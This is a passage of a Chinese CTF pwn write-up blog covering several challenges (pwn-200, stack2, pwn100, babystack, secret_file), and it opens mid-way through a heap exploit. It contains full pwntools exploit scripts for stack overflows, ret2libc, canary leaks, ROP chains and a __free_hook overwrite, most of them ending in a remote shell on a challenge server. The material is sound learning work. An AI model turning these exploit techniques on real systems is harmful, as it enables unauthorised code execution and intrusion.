class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line"></span><br><span class="line">	malloc(<span class="number">0x10</span>,<span class="string">&quot;4444&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;5555&quot;</span>)<span class="comment">###?</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)<span class="comment">##??</span></span><br><span class="line">uns_bin = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc.address = uns_bin - <span class="number">0x3ebca0</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;9999&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>,p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;1111&quot;</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3L2FydGljbGUvZGV0YWlscy8xMTM2OTc4OTI=">https://blog.csdn.net/qq_41202237/article/details/113697892<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNDc4NjIuaHRt">https://bbs.pediy.com/thread-247862.htm<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="pwn-200">pwn-200</h2>
<p>写这题的时候有半个多月没有接触栈溢出了…算是拿这题复习一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec b</span><br><span class="line">[*] <span class="string">&#x27;/home/pluto/Desktop/b&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>用ROPgadget搜索没有发现system和/bin/sh，于是猜到大概是要ret2libc</p>
<p>ida打开，程序很简单:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+2Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+30h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+34h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+38h] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+3Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+40h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+44h] [ebp-54h]</span></span><br><span class="line"></span><br><span class="line">  buf = <span class="number">1668048215</span>;</span><br><span class="line">  v2 = <span class="number">543518063</span>;</span><br><span class="line">  v3 = <span class="number">1478520692</span>;</span><br><span class="line">  v4 = <span class="number">1179927364</span>;</span><br><span class="line">  v5 = <span class="number">892416050</span>;</span><br><span class="line">  v6 = <span class="number">663934</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v7, <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, (<span class="keyword">char</span> *)&amp;buf);</span><br><span class="line">  write(<span class="number">1</span>, &amp;buf, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf));</span><br><span class="line">  sub_8048484();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_8048484</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">256u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现sub_8048484()存在栈溢出</p>
<p>复习一下找libc版本–&gt;getshell的步骤：</p>
<ol>
<li>用puts、write、printf之类的函数打印出某个函数的got，同时要控制好打印后的返回地址</li>
<li>获得libc的版本、system函数，/bin/sh的地址等，并计算在plt中的位置</li>
<li>构造payload</li>
</ol>
<p>这题我们使用write()打印出write.got：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">addr_out = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(write_plt) + p32(<span class="number">0x080483D0</span>) + p32(<span class="number">1</span>) + p32(write_got) +p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#1+write_got+4==write(..,..,..)</span></span><br><span class="line"><span class="comment">#返回地址为程序入口地址</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>, addr_out)</span><br><span class="line">a = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line">write_got_addr =  a</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_got_addr)</span><br></pre></td></tr></table></figure>
<p>这里提示一下，“p32(1) + p32(write_got) +p32(4)”构造的是一个write函数的参数，之前看别人的wp想了好久1和4是啥…太蠢了</p>
<p>用低12位搜索libc的时候注意，查看的是16进制的地址，别再在这卡一个晚上了…将地址和偏移地址进行计算的时候不用转成16进制（str和int的问题）</p>
<p>后续的代码：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">write_off = <span class="number">0x0d43c0</span></span><br><span class="line">sys_off = <span class="number">0x03a940</span></span><br><span class="line">binsh_off = <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line">base = write_got_addr - write_off</span><br><span class="line">sys = sys_off + base</span><br><span class="line">binsh = binsh_off + base</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(sys) + p32(<span class="number">1</span>) + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>这个payload比较简短，看到另一种做法如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一次结束后返回start的地址</span></span><br><span class="line"></span><br><span class="line">ppp_addr=<span class="number">0x0804856c</span></span><br><span class="line"><span class="comment">#三次pop指令的地址</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">payload2 =<span class="string">&#x27;A&#x27;</span>*junk+p32(read_plt)+p32(ppp_addr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress</span></span><br><span class="line"><span class="comment">#read(0,bss_addr,8)把&#x27;/bin/sh&#x27;读到bss段上，因为bss段可执行</span></span><br><span class="line">payload2+=p32(sys_addr)+p32(func_addr)+p32(bss_addr)</span><br><span class="line"><span class="comment">#用三次pop把指针指向了systemAddress，此时调用system()函数，再栈溢出把bss段上的内容(&#x27;/bin/sh&#x27;)当作参数传给system()调用</span></span><br><span class="line">r.send(payload2)</span><br><span class="line">r.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>思路值得学习</p>
<h2 id="stack2">stack2</h2>
<p>首先checksec：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec stack2</span><br><span class="line">[*] <span class="string">&#x27;/home/pluto/Desktop/stack2&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>32位程序，嗯 回忆一下传参方式，是直接放在函数后面，没有用到寄存器的<br>
看到有栈溢出保护，似乎先要泄露canary，继续。</p>
<p>程序很简单，修饰一些变量名后如下(忽略无关语句)：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> stack_size; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> choose; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> number[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> canary; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//blah blah blah</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many numbers you have:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;stack_size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Give me your numbers&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; stack_size &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">    number[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = stack_size; ; <span class="built_in">printf</span>(<span class="string">&quot;average is %.2lf\n&quot;</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choose);</span><br><span class="line">          <span class="keyword">if</span> ( choose != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Give me your number&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">99</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            number[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( choose &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( choose != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;id\t\tnumber&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%d\t\t%d\n&quot;</span>, k, number[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( choose != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;which number to change:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;stack_size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;new number:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">      number[stack_size] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choose != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += number[l];</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="comment">//无力吐槽f5出的代码，不过...能看就行   </span></span><br></pre></td></tr></table></figure>
<p>可以发现在选择3时，没有对输入的stack_size进行判断，所以可以更改栈中任意地址内容的，而且不会被canary发现。<br>
再看程序的函数，发现有system()和一个“hackhere”函数，直接返回了system(“/bin/sh”)（这是一个陷阱，在远程环境里没有用bash，而是使用了sh，但这个函数也提供了sh这个字符串）</p>
<p>所以现在的思路就是，通过choose=3，构造函数的返回地址为system的plt和参数，这就需要找到number这个数组的起始位置和返回地址的偏移量<br>
看ida，似乎偏移是0x74，但是究竟是不是呢？还是通过gdb验证一下吧</p>
<p>我们先把断点断在第一次向number数组输入的时候。此时写入的地址即为数组的首地址<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201207210639.png" alt="20201207210639"><br>
（前面输入的内容都为1）</p>
<p>执行前：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">EAX  0xffffcf18 ◂— 0xe0</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201207211134.png" alt="20201207211134"></p>
<p>执行后：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201207211413.png" alt="20201207211413"></p>
<p>所以首地址在cf18的位置，查看此时栈帧<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201207211929.png" alt="20201207211929"><br>
所以偏移为：cf9c-cf18==0x84<br>
(ida错了！！！)</p>
<p>因此可以易得exp了：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./stack2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">53339</span>)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;numbers\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">	addr = <span class="built_in">str</span>(addr)</span><br><span class="line">	data = <span class="built_in">str</span>(data)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;exit\n&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;change:\n&quot;</span>,addr)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;number:\n&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys: 0x08048450</span></span><br><span class="line">change(<span class="number">0x84</span>, <span class="number">0x50</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">1</span>,<span class="number">0x84</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line"><span class="comment">#sh: 0x08048987</span></span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>,<span class="number">0x87</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">1</span>,<span class="number">0x89</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;exit\n&quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>getshell</p>
<h2 id="pwn100">pwn100</h2>
<p>checksec :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec pwn100 </span><br><span class="line">[*] <span class="string">&#x27;/home/pluto/Desktop/pwn100&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>partial relro+NX<br>
进入ida&amp;f5，经过两次调用后看到主要的函数为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_40063D</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h] a2==200</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    read(<span class="number">0</span>, (<span class="keyword">void</span> *)(i + a1), <span class="number">1uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//a1栈空间大小为0x40，然后就是rbp、rsp</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201208055615.png" alt="20201208055615"><br>
可以看出存在明显的栈溢出，程序内也没有其他特别的sys函数和/bin/sh字符串，所以大概的思路是先查到libc版本，然后构造出system(/bin/sh)</p>
<p>得到exp：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">36759</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./b2&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./b2&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0400763</span></span><br><span class="line">main = <span class="number">0x40068E</span></span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">leak = <span class="string">&quot;a&quot;</span>*<span class="number">0x40</span> + <span class="string">&quot;a&quot;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main) </span><br><span class="line">leak = leak.ljust(<span class="number">200</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.send(leak)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))	<span class="comment">#!!!p.recv() will contain a &quot;0a&quot;(\n)</span></span><br><span class="line"></span><br><span class="line">base = puts_addr - <span class="number">0x06f690</span></span><br><span class="line">sys = base + <span class="number">0x045390</span></span><br><span class="line">binsh = base + 	<span class="number">0x18cd57</span></span><br><span class="line">payload = <span class="string">&quot;1&quot;</span>*<span class="number">0x40</span> + <span class="string">&quot;1&quot;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(binsh) + p64(sys) </span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>
<p>这题主要是recv puts地址的时候要注意，数据是否截取多了/少了，因为会影响计算别的函数/字符串。<br>
还有就是send和sendline和sendlineafter；recv和recvuntil对程序、执行exp的影响…</p>
<h2 id="pwn1">pwn1</h2>
<p>这题好迷…本地打通，远程打不通；远程打通，本地打不通（换过libc）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">43763</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./babystack&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./babystack&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)# local</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>) <span class="comment">#remote</span></span><br><span class="line">stack = <span class="string">&quot;a&quot;</span>*<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(stack)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line"></span><br><span class="line">init = <span class="number">0x00400908</span></span><br><span class="line">pop_rdi = <span class="number">0x0400a93</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">leak_addr = stack + p64(canary) + <span class="string">&quot;1&quot;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(init)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(leak_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)<span class="comment">#????	&amp; rjust||ljust</span></span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = 	<span class="number">0x045390</span></span><br><span class="line">binsh_addr = 	<span class="number">0x18cd57</span></span><br><span class="line">offset = puts_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system = offset + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = offset + binsh_addr</span><br><span class="line"></span><br><span class="line">payload2 = stack + p64(canary) + <span class="string">&quot;1&quot;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(binsh) + p64(system) + p64(init)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>就是一个 泄露canary、libc版本的过程。前几天就是这题和上一题，因为sendline/send/sendlineafter之类的问题把我整的怀疑人生…<br>
不想评价</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmh4ZG4vcC8xMjUzMDk0NS5odG1s">https://www.cnblogs.com/bhxdn/p/12530945.html<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="Recho">Recho</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC84YmViOTBiMjQ5ZDY=">https://www.jianshu.com/p/8beb90b249d6<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY291bnRmYXRjb2RlL3AvMTIzMjY4MDcuaHRtbA==">https://www.cnblogs.com/countfatcode/p/12326807.html<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYS9hcnRpY2xlL2RldGFpbHMvMTAyOTkyODg3">https://blog.csdn.net/seaaseesa/article/details/102992887<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="secret-file">secret_file</h2>
<p>运行一下：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201213143540.png" alt="20201213143540"></p>
<p>checksec：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201213142548.png" alt="20201213142548"><br>
x86-64的程序，所有保护都打开了哎…</p>
<p>拖入ida看主函数伪代码如下：(部分函数名经过修饰，并添加注释)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// er12</span></span><br><span class="line">  FILE *v9; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+0h] [rbp-308h]</span></span><br><span class="line">  <span class="keyword">char</span> *lineptr; <span class="comment">// [rsp+8h] [rbp-300h]</span></span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+10h] [rbp-2F8h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+110h] [rbp-1F8h] 执行的命令</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+12Bh] [rbp-1DDh] dest的sha256</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+16Ch] [rbp-19Ch] 参与sha256变换</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+18Ch] [rbp-17Ch] 与v15比较</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+1CCh] [rbp-13Ch]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+1D0h] [rbp-138h]</span></span><br><span class="line">  